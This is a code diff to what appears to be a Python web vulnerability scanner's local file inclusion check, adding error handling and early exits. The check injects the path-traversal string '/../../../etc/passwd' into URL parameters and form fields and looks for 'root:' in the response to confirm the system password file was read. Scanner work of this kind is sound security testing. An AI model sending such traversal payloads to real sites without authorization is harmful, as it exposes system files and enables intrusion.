@@ -1,5 +1,7 @@
 import re
 
+from werkzeug.exceptions import InternalServerError
+
 from Classes.ScanConfig import ScanConfig
 from Classes.Utilities import Utilities
 from CustomImports import html_report
@@ -12,10 +14,16 @@ def t_i_lfi(url):
         # for html_payload in self.DataStorage.payloads("HTML"):
         lfi_script = '/../../../etc/passwd'
         if '=' in url:
-            url = re.sub(r'=(?!.*=).*$', f'={lfi_script}', url)
-            if "root:" in ScanConfig.session.get(url).text.lower():
-                return True
+            try:
+                url = re.sub(r'=(?!.*=).*$', f'={lfi_script}', url)
+                if ScanConfig.session.get(url):
+                    if "root:" in ScanConfig.session.get(url).text.lower():
+                        return True
+            except InternalServerError:
+                pass
         form_list, form_data_list = Utilities.extract_forms_and_form_data(url)
+        if not (form_list or form_data_list):
+            return False
         for index, form in enumerate(form_list):
             injection_keys = Utilities.extract_injection_fields_from_form(form_data_list[index])
             # for html_payload in self.DataStorage.payloads("HTML"):
@@ -24,6 +32,8 @@ def t_i_lfi(url):
             for injection_key in injection_keys:
                 form_data_list[index][injection_key] = lfi_script
             response_injected = Utilities.submit_form(url, form, form_data_list[index])
+            if not response_injected:
+                return False
             if "root:" in response_injected.text.lower():
                 return True
         return False
